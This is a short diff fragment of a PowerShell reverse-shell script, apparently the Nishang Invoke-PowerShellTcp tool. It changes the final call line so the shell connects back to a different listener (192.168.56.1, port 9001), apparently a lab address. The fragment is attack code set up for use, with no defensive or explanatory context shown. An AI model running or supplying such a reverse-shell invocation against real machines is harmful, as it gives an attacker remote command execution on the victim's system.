@@ -87,4 +87,4 @@ function Invoke-PowerShellTcp
         Write-Error $_
     }
 }
-Invoke-PowerShellTcp -Reverse -IPAddress 192.168.100.50 -Port 2020
+Invoke-PowerShellTcp -Reverse -IPAddress 192.168.56.1 -Port 9001
